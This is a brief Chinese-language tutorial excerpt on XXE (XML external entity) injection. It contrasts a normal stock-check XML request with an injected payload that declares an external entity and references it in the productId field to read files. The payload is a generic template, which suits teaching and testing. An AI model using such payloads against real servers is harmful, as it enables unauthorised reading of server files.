服务器解析 XML 时, 如果启用了外部实体解析, 那么可以执行恶意的 XML 数据.

## 1. 案例

正常情况下查询 `productId=1` 的商品库存

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
</stockCheck>
```

注入 XXE, 读取文件 (其中 `&xxe;` 用于引用名称为 `xxe` 的外部实体)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "command"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
</stockCheck>
```

